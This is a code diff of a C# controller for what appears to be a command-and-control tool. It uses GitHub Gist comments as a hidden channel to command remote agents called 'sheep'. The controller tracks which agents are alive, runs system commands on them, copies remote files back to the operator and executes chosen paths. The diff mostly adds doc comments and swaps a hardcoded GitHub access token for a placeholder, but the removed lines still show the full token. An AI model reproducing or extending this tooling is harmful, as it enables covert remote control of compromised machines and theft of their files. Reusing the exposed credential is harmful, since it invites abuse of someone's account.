@@ -6,11 +6,17 @@ using Pasture.Messages;
 
 namespace Shepherd.Core;
 
+/// <summary>
+/// Class <c>ShepherdController</c> Sheep main controller
+/// </summary>
 public class ShepherdController
 {
     private GitHubClient _client;
     private IDictionary<string, string?> _sheepGists;
     private IDictionary<string, bool> _sheepAlive;
+
+    private const string HubGistId = "<HUB_GIST_ID>";
+    private const string GithubToken = "<GITHUB_TOKEN>";
 
     public ShepherdController()
     {
@@ -19,30 +25,63 @@ public class ShepherdController
         _sheepAlive = new Dictionary<string, bool>();
     }
 
+    
+    /// <summary>
+    /// Method <c>ConnectGitHubClient</c> Establish connection to Github API.
+    /// </summary>
     private GitHubClient ConnectGitHubClient()
     {
         var client = new GitHubClient(new ProductHeaderValue($"shepherd"));
         var tokenAuth =
-            new Credentials(
-                "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");
+            new Credentials(GithubToken);
         client.Credentials = tokenAuth;
 
         return client;
     }
-
+    
+    /// <summary>
+    /// Method <c>GetSheepGists</c> Return refreshed list of sheep.
+    /// </summary>
     public async Task<IDictionary<string, string?>> GetSheepGists()
     {
         await RefreshAllSheep();
         return _sheepGists;
     }
     
+    /// <summary>
+    /// Method <c>GetSheepAlive</c> Return refreshed list of sheep alive status.
+    /// </summary>
     public async Task<IDictionary<string, bool>> GetSheepAlive()
     {
         await RefreshAliveStatus();
         return _sheepAlive;
     }
+    
+    /// <summary>
+    /// Method <c>RefreshAliveStatus</c> Refresh sheep list.
+    /// </summary>
+    private async Task RefreshAllSheep()
+    {
+        var comments = await _client.Gist.Comment.GetAllForGist(HubGistId);
 
-    public async Task RefreshAliveStatus()
+        _sheepGists.Clear();
+        foreach (var comment in comments)
+        {
+            if (AssignmentMessage.TryParse(comment.Body, out var assignmentMessage))
+            {
+
+                if (!_sheepGists.TryGetValue(assignmentMessage.SheepId, out var gist))
+                {
+                    _sheepGists.Add(assignmentMessage.SheepId, assignmentMessage.GistId);
+                }
+            }
+        }
+    }
+
+    /// <summary>
+    /// Method <c>RefreshAliveStatus</c> Refresh sheep alive status.
+    /// </summary>
+    private async Task RefreshAliveStatus()
     {
         _sheepAlive.Clear();
         
@@ -66,26 +105,10 @@ public class ShepherdController
 
         }
     }
-    
-    public async Task RefreshAllSheep()
-    {
-        var comments = await _client.Gist.Comment.GetAllForGist("652bac55c3f50e604c1882abbec27c27");
 
-        _sheepGists.Clear();
-        foreach (var comment in comments)
-        {
-            if (AssignmentMessage.TryParse(comment.Body, out var assignmentMessage))
-            {
-
-                if (!_sheepGists.TryGetValue(assignmentMessage.SheepId, out var gist))
-                {
-                    _sheepGists.Add(assignmentMessage.SheepId, assignmentMessage.GistId);
-                }
-            }
-        }
-    }
-
-
+    /// <summary>
+    /// Method <c>WaitForResponse</c> Waits for request response.
+    /// </summary>
     private async Task WaitForResponse(string sheepKey, int commentId, CommandMessage commandMessage)
     {
         Console.WriteLine("Waitng for response (it will take up to one minute)...");
@@ -118,7 +141,10 @@ public class ShepherdController
             }
         }
     }
-
+    
+    /// <summary>
+    /// Method <c>CommandW</c> Sends message with linux command w.
+    /// </summary>
     public async Task CommandW(string sheepKey)
     {
         var gistId = _sheepGists[sheepKey];
@@ -128,6 +154,9 @@ public class ShepherdController
         await WaitForResponse(sheepKey, comment.Id, message);
     }
 
+    /// <summary>
+    /// Method <c>CommandLs</c> Sends message with linux command ls.
+    /// </summary>
     public async Task CommandLs(string sheepKey, string path)
     {
         var gistId = _sheepGists[sheepKey];
@@ -137,6 +166,9 @@ public class ShepherdController
         await WaitForResponse(sheepKey, comment.Id, message);
     }
 
+    /// <summary>
+    /// Method <c>CommandId</c> Sends message with linux command id.
+    /// </summary>
     public async Task CommandId(string sheepKey)
     {
         var gistId = _sheepGists[sheepKey];
@@ -146,6 +178,9 @@ public class ShepherdController
         await WaitForResponse(sheepKey, comment.Id, message);
     }
 
+    /// <summary>
+    /// Method <c>CommandCopy</c> Sends message which copies remote file to local.
+    /// </summary>
     public async Task CommandCopy(string sheepKey, string copyPath)
     {
         var gistId = _sheepGists[sheepKey];
@@ -155,6 +190,9 @@ public class ShepherdController
         await WaitForResponse(sheepKey, comment.Id, message);
     }
 
+    /// <summary>
+    /// Method <c>CommandExecute</c> Sends message which performs command.
+    /// </summary>
     public async Task CommandExecute(string sheepKey, string executePath)
     {
         var gistId = _sheepGists[sheepKey];
